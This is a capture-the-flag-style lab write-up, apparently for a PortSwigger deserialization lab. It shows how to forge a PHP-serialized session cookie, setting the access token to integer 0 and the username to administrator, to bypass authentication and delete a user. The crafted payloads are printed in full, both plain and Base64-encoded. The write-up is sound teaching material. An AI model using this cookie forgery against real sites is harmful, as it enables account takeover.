
# Modifying serialized data types

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.

You can log in to your own account using the following credentials: wiener:peter

Hint: To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.


---------------------------------------------

References: 

- https://portswigger.net/web-security/deserialization/exploiting



![img](images/Modifying%20serialized%20data%20types/1.png)

---------------------------------------------


First intercept a request after logging in:



![img](images/Modifying%20serialized%20data%20types/2.png)


Then decode the content of the session cookie:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z6217dzgdnj1g7ukjodao93t39fw1jvb";}
```



![img](images/Modifying%20serialized%20data%20types/3.png)


Test with the same username and an access token equal to the integer 0:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==
```



![img](images/Modifying%20serialized%20data%20types/4.png)


Then change the username to “administrator” and update the length of that string:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```



![img](images/Modifying%20serialized%20data%20types/5.png)


Then delete the user:



![img](images/Modifying%20serialized%20data%20types/6.png)
